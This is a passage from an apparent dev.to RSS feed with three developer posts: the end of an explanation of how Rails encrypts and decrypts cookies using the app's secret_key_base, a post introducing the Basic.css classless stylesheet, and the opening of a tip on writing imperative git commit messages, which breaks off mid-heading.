&lt;p&gt;The &lt;a href="https://github.com/rails/rails/blob/fe76a95b0d252a2d7c25e69498b720c96b243ea2/activesupport/lib/active_support/message_encryptor.rb#L166"&gt;cookie is encrypted&lt;/a&gt; with a &lt;a href="https://github.com/rails/rails/blob/fe76a95b0d252a2d7c25e69498b720c96b243ea2/actionpack/lib/action_dispatch/middleware/cookies.rb#L602"&gt;key that's generated&lt;/a&gt; in the same way as the key used to calculate the digest of a signed cookie. So we'll need the application's &lt;code&gt;secret_key_base&lt;/code&gt; to be able to decrypt the cookie. By default, the &lt;em&gt;salt&lt;/em&gt; is "authenticated encrypted cookie" but it can be changed by setting &lt;code&gt;config.action_dispatch.authenticated_encrypted_cookie_salt&lt;/code&gt;.  &lt;/p&gt;

&lt;p&gt;Using the &lt;a href="https://github.com/rails/rails/blob/fe76a95b0d252a2d7c25e69498b720c96b243ea2/activesupport/lib/active_support/message_encryptor.rb#L183"&gt;Rails source code as a reference&lt;/a&gt;, we can decrypt the cookie as follows:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="n"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"aDkxgmW4kaxoXBGnjxAaBY7D47WUOveFdeai5kk2hHlYVqDo7xtzZJup5euTdH5ja5iOt37MMS4SVXQT5RteaZjvpdlA%2FLQi7IYSPZLz--2A6LCUu%2F5AsLfSez--QD%2FwiA2t8QQrKk6rrROlPQ%3D%3D"&lt;/span&gt;
&lt;span class="n"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;URI&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;unescape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;iv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;auth_tag&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"--"&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nf"&gt;map&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt; 
  &lt;span class="no"&gt;Base64&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;strict_decode64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;span class="n"&gt;cipher&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;OpenSSL&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Cipher&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"aes-256-gcm"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Compute the encryption key&lt;/span&gt;
&lt;span class="n"&gt;secret_key_base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;Rails&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;application&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;secret_key_base&lt;/span&gt;
&lt;span class="n"&gt;secret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;OpenSSL&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;PKCS5&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;pbkdf2_hmac_sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;secret_key_base&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;"authenticated encrypted cookie"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;key_len&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Setup cipher for decryption and add inputs&lt;/span&gt;
&lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;decrypt&lt;/span&gt;
&lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;secret&lt;/span&gt;
&lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;iv&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;iv&lt;/span&gt;
&lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;auth_tag&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;auth_tag&lt;/span&gt;
&lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;auth_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;""&lt;/span&gt;

&lt;span class="c1"&gt;# Perform decryption&lt;/span&gt;
&lt;span class="n"&gt;cookie_payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;cookie_payload&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;final&lt;/span&gt;
&lt;span class="n"&gt;cookie_payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;parse&lt;/span&gt; &lt;span class="n"&gt;cookie_payload&lt;/span&gt;
&lt;span class="c1"&gt;# =&amp;gt; {"_rails"=&amp;gt;{"message"=&amp;gt;"InRva2VuIg==", "exp"=&amp;gt;nil, "pur"=&amp;gt;"cookie.remember_token"}}&lt;/span&gt;

&lt;span class="c1"&gt;# Decode Base64 encoded stored data&lt;/span&gt;
&lt;span class="n"&gt;decoded_stored_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;Base64&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;decode64&lt;/span&gt; &lt;span class="n"&gt;cookie_payload&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"_rails"&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s2"&gt;"message"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;stored_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;parse&lt;/span&gt; &lt;span class="n"&gt;decoded_stored_value&lt;/span&gt;
&lt;span class="c1"&gt;# =&amp;gt; "token"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;The above code should be pretty self-explanatory in demonstrating how OpenSSL is used to decrypt a cookie. Since the &lt;code&gt;secret_key_base&lt;/code&gt; is required to decrypt a cookie and that is a highly sensitive piece of information, it should NEVER be sent to the client and hence encrypted cookies should never be decrypted in your JavaScript application.  &lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#lifetime-of-a-cookie" class="anchor"&gt;
  &lt;/a&gt;
  Lifetime of a Cookie
&lt;/h1&gt;

&lt;p&gt;By default, a cookie expires with the browser's "session". That means that when the user closes the browser, all cookies with an expiry date of &lt;code&gt;Session&lt;/code&gt; will be deleted.   &lt;/p&gt;

&lt;p&gt;Cookies can be made to persist between sessions by specifying an expiry date:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;show&lt;/span&gt;
  &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:welcome_message_shown&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="ss"&gt;value: &lt;/span&gt;&lt;span class="s2"&gt;"true"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="ss"&gt;expires: &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;days&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Rails also has a special &lt;em&gt;permanent&lt;/em&gt; cookie type which sets the expiry date for 20 years in the future.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;show&lt;/span&gt;
  &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;permanent&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:welcome_message_shown&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"true"&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Signed and encrypted cookies can be chained with the &lt;em&gt;permanent&lt;/em&gt; type to persist them across browser sessions.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;show&lt;/span&gt;
  &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;signed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;permanent&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:user_id&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"42"&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;show&lt;/span&gt;
  &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;encrypted&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;permanent&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:remember_token&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"token"&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;The special session cookie&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Rails provides a special kind of cookie called a session cookie which, as the name suggests has an expiry of &lt;strong&gt;Session&lt;/strong&gt;. This is an encrypted cookie and stores the user's data in a &lt;code&gt;Hash&lt;/code&gt;. It's a great place to store things like authentication tokens and redirect locations. Rails stores &lt;a href="https://api.rubyonrails.org/classes/ActionDispatch/Flash.html"&gt;&lt;code&gt;Flash&lt;/code&gt;&lt;/a&gt; data in the session cookie.  &lt;/p&gt;

&lt;p&gt;Data can be stored in the session cookie similarly to regular cookies:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create&lt;/span&gt;
  &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:auth_token&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"token"&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#conclusion" class="anchor"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h1&gt;

&lt;p&gt;I hope this post gave you a good understanding of cookies and also the &lt;code&gt;MessageVerifier&lt;/code&gt; and &lt;code&gt;MessageEncryptor&lt;/code&gt; APIs which have some great applications of their own outside of cookies.   &lt;/p&gt;

&lt;p&gt;I'm not a cryptography expert and everything in this post was gleaned from looking at the Rails source code. So if something's unclear or I've got something wrong; write a comment and let me know!&lt;/p&gt;

</description>
      <category>rails</category>
      <category>ruby</category>
      <category>security</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Basic.css - Classless CSS Starter File</title>
      <author>Vladimir Carrer</author>
      <pubDate>Mon, 18 Jan 2021 15:01:15 +0000</pubDate>
      <link>https://dev.to/vladocar/basic-css-classless-css-starter-file-ok0</link>
      <guid>https://dev.to/vladocar/basic-css-classless-css-starter-file-ok0</guid>
      <description>&lt;p&gt;Basic.css gives you basic CSS formatting and ability to make basic grids with only HTML5 syntax. You can use this project to Set your default styling.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#list-of-features" class="anchor"&gt;
  &lt;/a&gt;
  List of features
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;  Lightweight 1kb minified and gzipped.&lt;/li&gt;
&lt;li&gt;  Basic typography.&lt;/li&gt;
&lt;li&gt;  Basic forms.&lt;/li&gt;
&lt;li&gt;  Custom colors.&lt;/li&gt;
&lt;li&gt;  Dark theme.&lt;/li&gt;
&lt;li&gt;  Round corners.&lt;/li&gt;
&lt;li&gt;  Flex Grid without classes.&lt;/li&gt;
&lt;li&gt;  Flex Grid cards.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Demo: &lt;a href="https://vladocar.github.io/Basic.css/"&gt;https://vladocar.github.io/Basic.css/&lt;/a&gt;&lt;/p&gt;

&lt;h5&gt;
  &lt;a href="#you-can-change-root-css-variables-with-your-color-palette" class="anchor"&gt;
  &lt;/a&gt;
  You can change root css variables with your color palette:
&lt;/h5&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="nd"&gt;:root&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="py"&gt;--c1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="m"&gt;#0074d9&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="py"&gt;--c2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="m"&gt;#eee&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="py"&gt;--c3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="m"&gt;#fff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="py"&gt;--c4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="m"&gt;#000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="py"&gt;--c5&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="m"&gt;#fff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h5&gt;
  &lt;a href="#or-adjust-the-round-corners" class="anchor"&gt;
  &lt;/a&gt;
  Or adjust the round corners
&lt;/h5&gt;

&lt;p&gt;By default are 8px, use --rc: 0px; if you don't like round corners.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="nd"&gt;:root&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="py"&gt;--rc&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;8px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h5&gt;
  &lt;a href="#override-the-colors-in-the-dark-mode" class="anchor"&gt;
  &lt;/a&gt;
  Override the colors in the dark mode:
&lt;/h5&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="k"&gt;@media&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prefers-color-scheme&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;dark&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nd"&gt;:root&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="py"&gt;--c2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="m"&gt;#333&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="py"&gt;--c3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="m"&gt;#1e1f20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="py"&gt;--c4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="m"&gt;#fff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h5&gt;
  &lt;a href="#how-you-can-use-the-infinity-flex-grid" class="anchor"&gt;
  &lt;/a&gt;
  How you can use the infinity flex grid?
&lt;/h5&gt;

&lt;p&gt;Use the HTML5 tags section and nested section to make flex grid.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;section&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;section&amp;gt;&lt;/span&gt; 1 &lt;span class="nt"&gt;&amp;lt;/section&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;section&amp;gt;&lt;/span&gt; 2 &lt;span class="nt"&gt;&amp;lt;/section&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;section&amp;gt;&lt;/span&gt; 3 &lt;span class="nt"&gt;&amp;lt;/section&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/section&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;section&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;section&amp;gt;&lt;/span&gt; 1 &lt;span class="nt"&gt;&amp;lt;/section&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;section&amp;gt;&lt;/span&gt; 2 &lt;span class="nt"&gt;&amp;lt;/section&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;section&amp;gt;&lt;/span&gt; 3 &lt;span class="nt"&gt;&amp;lt;/section&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;section&amp;gt;&lt;/span&gt; 4 &lt;span class="nt"&gt;&amp;lt;/section&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/section&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Demo: &lt;a href="https://vladocar.github.io/Basic.css/grid.html"&gt;https://vladocar.github.io/Basic.css/grid.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Use the HTML5 tags selection and article to make cards.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;section&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;article&amp;gt;&lt;/span&gt; 1 &lt;span class="nt"&gt;&amp;lt;/article&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;article&amp;gt;&lt;/span&gt; 2 &lt;span class="nt"&gt;&amp;lt;/article&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;article&amp;gt;&lt;/span&gt; 3 &lt;span class="nt"&gt;&amp;lt;/article&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/section&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Demo: &lt;a href="https://vladocar.github.io/Basic.css/cards.html"&gt;https://vladocar.github.io/Basic.css/cards.html&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#how-to-use-this-project" class="anchor"&gt;
  &lt;/a&gt;
  How to use this project?
&lt;/h4&gt;

&lt;p&gt;Simply download and personalize the &lt;strong&gt;basic.css&lt;/strong&gt; file.&lt;/p&gt;

&lt;p&gt;Or&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npm i @vladocar/basic.css
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#why-should-you-use-this-project" class="anchor"&gt;
  &lt;/a&gt;
  Why should you use this project?
&lt;/h4&gt;

&lt;p&gt;Instead of using CSS Reset you could just Set the basic css formatting and styling. You could even make some grids with the HTML5 tags. Naturally if you want to build something more complex you should use CSS classes and this project works great in combination with other CSS frameworks.&lt;/p&gt;

&lt;p&gt;Github: &lt;a href="https://github.com/vladocar/Basic.css"&gt;https://github.com/vladocar/Basic.css&lt;/a&gt;&lt;/p&gt;

</description>
      <category>css</category>
      <category>webdev</category>
      <category>github</category>
    </item>
    <item>
      <title>OhSnap! Instantly Improve Your Git Commit Messages</title>
      <author>Gedalya Krycer</author>
      <pubDate>Mon, 18 Jan 2021 14:00:34 +0000</pubDate>
      <link>https://dev.to/gedalyakrycer/ohsnap-instantly-improve-your-git-commit-messages-45fg</link>
      <guid>https://dev.to/gedalyakrycer/ohsnap-instantly-improve-your-git-commit-messages-45fg</guid>
      <description>&lt;p&gt;&lt;em&gt;The "OhSnap!" series explores bite-sized tips that I have learned and that you can apply today.&lt;/em&gt;&lt;/p&gt;




&lt;p&gt;Sometimes becoming a better developer comes down to slight course corrections in our daily workflows.&lt;/p&gt;

&lt;p&gt;Recently I came across &lt;a href="https://chris.beams.io/posts/git-commit/"&gt;this awesome article by, Chris Beams,&lt;/a&gt; that explains how to do that with an action we all perform  — &lt;strong&gt;git commits&lt;/strong&gt;.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#the-tip" class="anchor"&gt;
  &lt;/a&gt;
  The Tip
&lt;/h3&gt;

&lt;p&gt;Write git commits &lt;strong&gt;imperatively&lt;/strong&gt;, not as a &lt;strong&gt;&lt;em&gt;description&lt;/em&gt;&lt;/strong&gt;. &lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#the-wrong-way" class="anchor"&gt;
  &lt;/a&gt;
  The Wrong Way
&lt;/h4&gt;

&lt;p&gt;&lt;code&gt;git commit -m "Added new page"&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;git commit -m "Fixed margin above the hero banner for a better layout"&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;git commit -m "This adds a new color"&lt;/code&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#the-right-way" class="anchor"&gt;
  &lt;/a&gt;
  The Right Way
&lt;/h4&gt;

&lt;p&gt;&lt;code&gt;git commit -m "Add About page"&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;git commit -m "Fix spacing above the hero banner"&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;git commit -m "Change headline color"&lt;/code&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#what-is-the-difference" class="anchor"&gt;
  &lt;/a&gt;
  What is the difference?
&lt;/h4&gt;

&lt;p&gt;The second versions are all actions. They sound abrupt, but they are meant to instruct what is about to happen, not describe why you did something. &lt;/p&gt;

&lt;p&gt;Notice that even as imperative actions, they still communicate with specificity on exactly what was done.&lt;/p&gt;

&lt;p&gt;At the end of the day, all we really want to know is what this commit will do to our main branch if merged. The body of the commit or a pull request can always hold the details of why you did something. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#how-do-i-write-these-correctly" class="anchor"&gt;
  &lt;/a&gt;
